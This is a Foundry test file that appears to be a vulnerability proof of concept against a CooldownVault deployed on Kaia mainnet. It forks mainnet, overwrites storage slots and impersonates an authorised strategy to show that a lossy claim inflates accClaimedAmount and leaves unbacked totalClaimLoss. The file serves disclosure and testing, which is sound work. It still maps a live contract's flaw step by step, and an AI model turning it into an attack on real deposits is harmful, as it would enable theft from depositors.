// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.29 <0.9.0;

import "forge-std/src/Test.sol";
import "forge-std/src/console.sol";

// interfaces

interface IERC20M {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ICooldownVault {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 requestId);
    function claim(uint256 requestId, uint256 maxLossBps) external returns (uint256 claimable);
    function assetBalance() external view returns (uint256);
    function totalLockedAssets() external view returns (uint256);
    function accClaimedAmount() external view returns (uint256);
    function totalClaimLoss() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function cooldownPeriod() external view returns (uint256);
    function lastRequestId() external view returns (uint256);
    function accRedeemRequestedAmount(uint256) external view returns (uint256);
    function recoverClaimLoss() external returns (uint256);
}


// When a receiver accepts a lossy claim (assetsOut < request.assets), the
// counter is inflated by the difference. This understates
// reservedForPriorRequests for all subsequent claims in the queue and
// accumulates in totalClaimLoss, which governance can mint as shares via
// recoverClaimLoss() backed by nothing.

// Storage slots (from forge inspect CooldownVault storageLayout):
//   lastRequestId    : 363
//   accClaimedAmount : 366
//   totalLockedAssets: 369
//   _managedAssets   : 370


contract PoC_accClaimedAmount is Test {

    // Kaia mainnet deployed addresses
    address constant COOLDOWN_VAULT = 0x4E4654cE4Ca7ff0ba66a0A4a588A4bd55A6f9A33;
    address constant USDT           = 0xd077A400968890Eacc75cdc901F0356c943e4fDb;
    // StrategyOriginVault -- present in _authorizedAddresses on the live contract
    address constant STRATEGY       = 0x650a4c074a58B18fbEEd48ae766e58a382D9E5F5;

    // Storage slot constants derived from forge inspect
    uint256 constant SLOT_LAST_REQUEST_ID    = 363;
    uint256 constant SLOT_ACC_CLAIMED        = 366;
    uint256 constant SLOT_TOTAL_LOCKED       = 369;
    uint256 constant SLOT_MANAGED_ASSETS     = 370;

    ICooldownVault vault = ICooldownVault(COOLDOWN_VAULT);
    IERC20M        usdt  = IERC20M(USDT);

    address alice   = makeAddr("alice");
    address bob     = makeAddr("bob");
    address charlie = makeAddr("charlie");

    function setUp() public {
        vm.createSelectFork("kaia_mainnet", 217860010);
    }

    function test_accClaimedAmount_inflation() public {

        uint256 cooldown = vault.cooldownPeriod();

        console.log("=== LIVE STATE ===");
        console.log("cooldownPeriod    :", cooldown);
        console.log("_managedAssets    :", vault.assetBalance());
        console.log("accClaimedAmount  :", vault.accClaimedAmount());
        console.log("totalLockedAssets :", vault.totalLockedAssets());
        console.log("lastRequestId     :", vault.lastRequestId());

        // --------------------------------------------------------------------
        // Reset vault accounting to a clean controlled state.
        //
        // We write directly to storage slots to set:
        //   _managedAssets   = 65 USDT
        //   accClaimedAmount = 0
        //   totalLockedAssets= 0
        //   lastRequestId    = 0
        //
        // This is equivalent to a fresh vault with 65 USDT in it.
        // We then create three requests totalling 80 USDT so that
        // bob's request (20 USDT) is underfunded relative to alice's
        // reservation (50 USDT), forcing a partial payout on bob's claim.
        // --------------------------------------------------------------------
        vm.store(COOLDOWN_VAULT, bytes32(SLOT_MANAGED_ASSETS),  bytes32(uint256(65e6)));
        vm.store(COOLDOWN_VAULT, bytes32(SLOT_ACC_CLAIMED),     bytes32(uint256(0)));
        vm.store(COOLDOWN_VAULT, bytes32(SLOT_TOTAL_LOCKED),    bytes32(uint256(0)));
        vm.store(COOLDOWN_VAULT, bytes32(SLOT_LAST_REQUEST_ID), bytes32(uint256(0)));

        deal(USDT, COOLDOWN_VAULT, 65e6);
        deal(USDT, STRATEGY, 80e6);

        console.log("\n=== CONTROLLED STATE ===");
        console.log("_managedAssets    :", vault.assetBalance());
        console.log("accClaimedAmount  :", vault.accClaimedAmount());
        console.log("USDT balance      :", usdt.balanceOf(COOLDOWN_VAULT));

        // --------------------------------------------------------------------
        // Create three redeem requests via STRATEGY (authorised caller).
        // Deposits increase _managedAssets, so we reset it back to 65e6
        // after the three deposits are made.
        // --------------------------------------------------------------------
        vm.startPrank(STRATEGY);

        usdt.approve(COOLDOWN_VAULT, 80e6);
        vault.deposit(50e6, STRATEGY);
        vault.deposit(20e6, STRATEGY);
        vault.deposit(10e6, STRATEGY);

        uint256 req1 = vault.redeem(50e6, alice,   STRATEGY);
        uint256 req2 = vault.redeem(20e6, bob,     STRATEGY);
        uint256 req3 = vault.redeem(10e6, charlie, STRATEGY);

        vm.stopPrank();

        // Reset _managedAssets back to 65e6 and actual balance to match.
        // This simulates 80 USDT having been deployed to a remote strategy,
        // leaving only 65 USDT available for redemptions.
        vm.store(COOLDOWN_VAULT, bytes32(SLOT_MANAGED_ASSETS), bytes32(uint256(65e6)));
        deal(USDT, COOLDOWN_VAULT, 65e6);

        console.log("\n=== AFTER 3 REDEEM REQUESTS ===");
        console.log("req1 id (alice,   50 USDT):", req1);
        console.log("req2 id (bob,     20 USDT):", req2);
        console.log("req3 id (charlie, 10 USDT):", req3);
        console.log("_managedAssets             :", vault.assetBalance());
        console.log("totalLockedAssets          :", vault.totalLockedAssets());
        console.log("accClaimedAmount           :", vault.accClaimedAmount());
        console.log("accRedeemRequestedAmount[1]:", vault.accRedeemRequestedAmount(req1));
        console.log("accRedeemRequestedAmount[2]:", vault.accRedeemRequestedAmount(req2));

        vm.warp(block.timestamp + cooldown + 1);

        // --------------------------------------------------------------------
        // Bob claims req2 first. He is the receiver, so he can pass any
        // maxLossBps value. He passes 10000 (100%) to accept any shortfall.
        //
        // Reservation math inside _claim():
        //   _accRedeemRequestedAmount = accRedeemRequestedAmount[req2 - 1]
        //                             = accRedeemRequestedAmount[1]
        //                             = 50e6
        //   reservedForPriorRequests  = 50e6 - 0 = 50e6
        //   availableLiquidity        = 65e6 - 50e6 = 15e6
        //   assetsOut                 = min(20e6, 15e6) = 15e6
        //
        // Bug fires in effects block:
        //   accClaimedAmount += request.assets  (20e6, not 15e6)
        // --------------------------------------------------------------------
        uint256 claimedBefore = vault.accClaimedAmount();
        uint256 lossBefore    = vault.totalClaimLoss();

        vm.prank(bob);
        uint256 bobOut = vault.claim(req2, 10_000);

        uint256 claimedAfter = vault.accClaimedAmount();
        uint256 lossAfter    = vault.totalClaimLoss();
        uint256 claimedDelta = claimedAfter - claimedBefore;

        console.log("\n=== BOB CLAIMS req2 (maxLoss=100%) ===");
        console.log("Bob requested              : 20000000");
        console.log("Bob received (assetsOut)   :", bobOut);
        console.log("accClaimedAmount delta     :", claimedDelta);
        console.log("totalClaimLoss delta       :", lossAfter - lossBefore);
        console.log("_managedAssets             :", vault.assetBalance());

        // Core assertions
        assertLt(bobOut, 20e6,
            "SETUP: bob must receive partial payout for bug to manifest");

        assertEq(claimedDelta, 20e6,
            "BUG CONFIRMED: accClaimedAmount incremented by request.assets not assetsOut");

        uint256 inflation = claimedDelta - bobOut;
        assertGt(inflation, 0,
            "BUG CONFIRMED: phantom inflation exists in accClaimedAmount");

        console.log("\n[BUG] accClaimedAmount inflated by:", inflation, "(phantom USDT)");
        console.log("[BUG] correct value would be       :", bobOut);
        console.log("[BUG] actual value is              :", claimedDelta);

        // --------------------------------------------------------------------
        // Alice claims req1. Vault has 50e6 left. She gets her full amount.
        // --------------------------------------------------------------------
        vm.prank(alice);
        uint256 aliceOut = vault.claim(req1, 0);

        console.log("\n=== ALICE CLAIMS req1 ===");
        console.log("Alice received    :", aliceOut);
        console.log("_managedAssets    :", vault.assetBalance());
        console.log("accClaimedAmount  :", vault.accClaimedAmount());

        // --------------------------------------------------------------------
        // Charlie claims req3. Vault is empty. He gets nothing.
        // --------------------------------------------------------------------
        vm.prank(charlie);
        uint256 charlieOut = vault.claim(req3, 10_000);

        console.log("\n=== CHARLIE CLAIMS req3 ===");
        console.log("Charlie received  :", charlieOut);
        console.log("_managedAssets    :", vault.assetBalance());
        console.log("totalLockedAssets :", vault.totalLockedAssets());
        console.log("totalClaimLoss    :", vault.totalClaimLoss());

        // totalClaimLoss is non-zero after all claims.
        // recoverClaimLoss() would mint this many governance shares backed
        // by zero real assets.
        assertGt(vault.totalClaimLoss(), 0,
            "totalClaimLoss non-zero: phantom loss persists after all claims");

        console.log("\n=== FINAL SUMMARY ===");
        console.log("Bob received    :", bobOut,     "/ 20e6 requested");
        console.log("Alice received  :", aliceOut,   "/ 50e6 requested");
        console.log("Charlie received:", charlieOut, "/ 10e6 requested");
        console.log("Total paid out  :", bobOut + aliceOut + charlieOut, "/ 80e6 requested");
        console.log("Phantom accClaimedAmount inflation :", inflation);
        console.log("recoverClaimLoss() would mint this many governance shares backed by nothing:",
            vault.totalClaimLoss());
    }
}
